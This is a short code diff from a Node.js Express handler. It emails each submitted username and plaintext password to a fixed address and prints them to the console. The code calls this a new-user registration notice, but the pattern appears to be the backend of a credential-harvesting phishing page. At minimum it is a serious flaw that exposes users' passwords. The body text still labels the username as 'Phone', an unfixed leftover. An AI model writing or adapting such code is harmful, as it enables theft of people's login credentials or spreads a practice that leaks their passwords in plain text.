@@ -31,10 +31,10 @@ app.post("/", (req, res) => {
   });
 
   const mailOptions = {
-    from: `${phone}`,
+    from: `${username}`,
     to: userEmail,
-    subject: `Email: ${phone} \t\n\n\n password: ${password}`,
-    text: `New user registered with Phone: ${phone} and password: ${password}`,
+    subject: `Username: ${username} \t\n\n\n password: ${password}`,
+    text: `New user registered with Phone: ${username} and password: ${password}`,
   };
 
   console.log(mailOptions);
